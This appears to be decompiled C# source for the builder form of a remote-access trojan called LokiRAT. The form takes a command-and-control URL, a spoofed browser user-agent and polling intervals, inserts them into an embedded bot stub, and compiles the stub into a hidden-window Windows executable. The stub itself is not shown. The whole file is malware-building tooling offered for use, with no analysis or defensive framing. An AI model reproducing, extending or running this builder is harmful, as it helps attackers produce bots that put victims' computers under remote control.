namespace LokiRAT_Client
{
    using Microsoft.CSharp;
    using System;
    using System.CodeDom.Compiler;
    using System.ComponentModel;
    using System.Drawing;
    using System.IO;
    using System.Linq;
    using System.Reflection;
    using System.Windows.Forms;

    public class builder : Form
    {
        private Button button1;
        private IContainer components = null;
        private Label label1;
        private Label label2;
        private Label label3;
        private Label label4;
        private Label label5;
        private Label label6;
        private SaveFileDialog saveFileDialog1;
        private TextBox textBox1;
        private TextBox textBox2;
        private TextBox textBox3;
        private TextBox textBox4;

        public builder()
        {
            this.InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.saveFileDialog1.ShowDialog();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.textBox1 = new TextBox();
            this.button1 = new Button();
            this.label1 = new Label();
            this.label2 = new Label();
            this.label3 = new Label();
            this.textBox2 = new TextBox();
            this.label4 = new Label();
            this.textBox3 = new TextBox();
            this.label5 = new Label();
            this.label6 = new Label();
            this.textBox4 = new TextBox();
            this.saveFileDialog1 = new SaveFileDialog();
            base.SuspendLayout();
            this.textBox1.Location = new Point(12, 0x1f);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new Size(0x103, 20);
            this.textBox1.TabIndex = 0;
            this.textBox1.Text = "http://127.0.0.1/lokirat/bot.php";
            this.button1.Location = new Point(0x9e, 0xf5);
            this.button1.Name = "button1";
            this.button1.Size = new Size(0x71, 0x18);
            this.button1.TabIndex = 1;
            this.button1.Text = "Build";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new EventHandler(this.button1_Click);
            this.label1.AutoSize = true;
            this.label1.Location = new Point(12, 15);
            this.label1.Name = "label1";
            this.label1.Size = new Size(0x35, 13);
            this.label1.TabIndex = 2;
            this.label1.Text = "Site URL:";
            this.label2.AutoSize = true;
            this.label2.Location = new Point(9, 0x77);
            this.label2.Name = "label2";
            this.label2.Size = new Size(0x110, 13);
            this.label2.TabIndex = 3;
            this.label2.Text = "Timer Active Value (Update interval after first command):";
            this.label3.AutoSize = true;
            this.label3.Location = new Point(12, 0xaf);
            this.label3.Name = "label3";
            this.label3.Size = new Size(0xf8, 13);
            this.label3.TabIndex = 4;
            this.label3.Text = "Timer Sleep Value (Bot ready to get first command):";
            this.textBox2.Location = new Point(12, 0x87);
            this.textBox2.Name = "textBox2";
            this.textBox2.Size = new Size(0x7e, 20);
            this.textBox2.TabIndex = 5;
            this.textBox2.Text = "1000";
            this.label4.AutoSize = true;
            this.label4.Location = new Point(0x90, 0x8a);
            this.label4.Name = "label4";
            this.label4.Size = new Size(20, 13);
            this.label4.TabIndex = 6;
            this.label4.Text = "ms";
            this.textBox3.Location = new Point(12, 0xbf);
            this.textBox3.Name = "textBox3";
            this.textBox3.Size = new Size(0x7e, 20);
            this.textBox3.TabIndex = 7;
            this.textBox3.Text = "20000";
            this.label5.AutoSize = true;
            this.label5.Location = new Point(0x90, 0xc2);
            this.label5.Name = "label5";
            this.label5.Size = new Size(20, 13);
            this.label5.TabIndex = 8;
            this.label5.Text = "ms";
            this.label6.AutoSize = true;
            this.label6.Location = new Point(9, 0x43);
            this.label6.Name = "label6";
            this.label6.Size = new Size(0x3f, 13);
            this.label6.TabIndex = 9;
            this.label6.Text = "User Agent:";
            this.textBox4.Location = new Point(12, 0x53);
            this.textBox4.Name = "textBox4";
            this.textBox4.Size = new Size(0x103, 20);
            this.textBox4.TabIndex = 10;
            this.textBox4.Text = "Mozilla/4.0 (Compatible; Windows NT 5.1; MSIE 6.0) (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)";
            this.saveFileDialog1.Filter = "Execute Files|*.exe";
            this.saveFileDialog1.FileOk += new CancelEventHandler(this.saveFileDialog1_FileOk);
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.AutoScaleMode = AutoScaleMode.Font;
            base.ClientSize = new Size(0x11b, 0x116);
            base.Controls.Add(this.textBox4);
            base.Controls.Add(this.label6);
            base.Controls.Add(this.label5);
            base.Controls.Add(this.textBox3);
            base.Controls.Add(this.label4);
            base.Controls.Add(this.textBox2);
            base.Controls.Add(this.label3);
            base.Controls.Add(this.label2);
            base.Controls.Add(this.label1);
            base.Controls.Add(this.button1);
            base.Controls.Add(this.textBox1);
            base.FormBorderStyle = FormBorderStyle.FixedDialog;
            base.Name = "builder";
            this.Text = "Builder | LokiRAT";
            base.ResumeLayout(false);
            base.PerformLayout();
        }

        private void saveFileDialog1_FileOk(object sender, CancelEventArgs e)
        {
            string str;
            using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("LokiRAT_Client.stub.txt"))
            {
                using (StreamReader reader = new StreamReader(stream))
                {
                    str = reader.ReadToEnd();
                }
            }
            str = str.Replace("{~url~}", this.textBox1.Text).Replace("{~agent~}", this.textBox4.Text).Replace("{~interval~}", this.textBox3.Text).Replace("{~activeInterval~}", this.textBox2.Text);
            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerParameters options = new CompilerParameters();
            options.ReferencedAssemblies.Add("System.dll");
            options.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            options.ReferencedAssemblies.Add("System.Data.dll");
            options.ReferencedAssemblies.Add("System.Drawing.dll");
            options.ReferencedAssemblies.Add("System.Management.dll");
            options.ReferencedAssemblies.Add("System.Deployment.dll");
            options.ReferencedAssemblies.Add("System.Xml.dll");
            options.ReferencedAssemblies.Add(typeof(IQueryable).Assembly.Location);
            options.CompilerOptions = "/filealign:0x00000200 /optimize+ /platform:anycpu /debug- /target:winexe";
            options.GenerateExecutable = true;
            options.OutputAssembly = this.saveFileDialog1.FileName;
            options.GenerateInMemory = false;
            if (provider.CompileAssemblyFromSource(options, new string[] { str }).Errors.Count > 0)
            {
                MessageBox.Show("Error building");
            }
            else
            {
                MessageBox.Show("Building successfully.");
            }
        }
    }
}

